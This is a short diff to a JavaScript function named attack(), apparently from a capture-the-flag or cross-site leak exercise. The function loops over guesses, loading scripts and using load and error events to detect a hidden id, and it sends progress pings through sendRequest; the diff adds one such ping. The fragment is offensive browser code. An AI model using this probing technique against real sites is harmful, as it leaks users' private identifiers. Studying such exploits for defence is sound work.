@@ -8,6 +8,7 @@ function sendRequest(url) {
 var idFound = false;
     
 async function attack() {
+    sendRequest("test=true");
     let i = 0;
     while (!idFound) {
         try {
@@ -24,7 +25,7 @@ async function attack() {
                     resolve();
                 }
                 script.onerror = reject;
-                if (i % 100000 == 0) sendRequest("test="+i);
+                if (i % 100000 == 0) sendRequest("test="+i)
             })
             
         } catch (error) {
